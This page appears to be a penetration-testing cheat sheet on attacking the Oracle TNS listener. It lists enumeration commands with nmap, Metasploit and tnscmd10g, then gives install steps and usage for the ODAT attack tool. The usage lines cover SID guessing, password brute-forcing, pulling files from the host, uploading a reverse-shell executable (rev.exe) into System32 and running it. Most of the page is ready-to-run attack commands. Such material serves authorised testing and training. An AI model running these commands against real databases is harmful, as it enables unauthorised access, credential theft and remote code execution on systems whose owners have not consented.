# Port 1521,1522-1529 - Oracle TNS Listener

## Enumeration

### Basic

```bash
nmap --script "oracle-tns-version" -p 1521 -T4 -sV <IP>
msf> use auxiliary/scanner/oracle/tnslsnr_version
#apt install tnscmd10g
tnscmd10g version -p 1521 -h <IP>
```



## ODAT&#x20;

**ODAT** (Oracle Database Attacking Tool) is an open source **penetration testing** tool that tests the security of **Oracle Databases remotely**.

Usage examples of ODAT:

* You have an Oracle database listening remotely and want to find valid **SIDs** and **credentials** in order to connect to the database
* You have a valid Oracle account on a database and want to **escalate your privileges** to become DBA or SYSDBA
* You have a Oracle account and you want to **execute system commands** (e.g. **reverse shell**) in order to move forward on the operating system hosting the database

Tested on Oracle Database **10g**, **11g**, **12c**, **18c** and **19c**.

{% embed url="https://github.com/quentinhardy/odat" %}

### Instalation

```bash
git clone https://github.com/quentinhardy/odat.git

cd odat/
git submodule init
git submodule update
```

* Get instant client basic, sdk (devel) and sqlplus from the Oracle web site:
  * X64: [http://www.oracle.com/technetwork/topics/linuxx86-64soft-092277.html](http://www.oracle.com/technetwork/topics/linuxx86-64soft-092277.html)
  * X86: [http://www.oracle.com/technetwork/topics/linuxsoft-082809.html](http://www.oracle.com/technetwork/topics/linuxsoft-082809.html)

```
sudo apt-get install libaio1 python3-dev alien python3-pip
pip3 install cx_Oracle

mv /home/kali/downloads/*.rm .
sudo alien --to-deb *.rpm
dpgk -i *
```

Add to .zshrc

```bash
export ORACLE_HOME=/usr/lib/oracle/19.3/client64/
export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib
export PATH=${ORACLE_HOME}bin:$PATH
```



### Usage examples



{% code overflow="wrap" %}
```python
# SID Enumeration
python3 odat.py sidguesser -s <IP-ADDRESS>

# User/Pass bruteforce
python3 odat.py passwordguesser -s <IP> -d <SID>
python3 odat.py passwordguesser -s <IP> --accounts-file <wordlist> -d <SID>

# Get remote/put files
python3 odat.py utlfile --getFile 'C:/Windows/System32/drivers/etc' hosts hosts  -s <IP> -d <SID> -U <username > -P <password> [--sysdba]

python3 odat.py utlfile --putFile 'C:/Windows/System32' rev.exe rev.exe -s <IP> -d <SID> -U <username> -P <password> [--sysdba]

# Execute remote file
python3 odat.py externaltable --exec 'C:/Windows/System32' rev.exe 
```
{% endcode %}
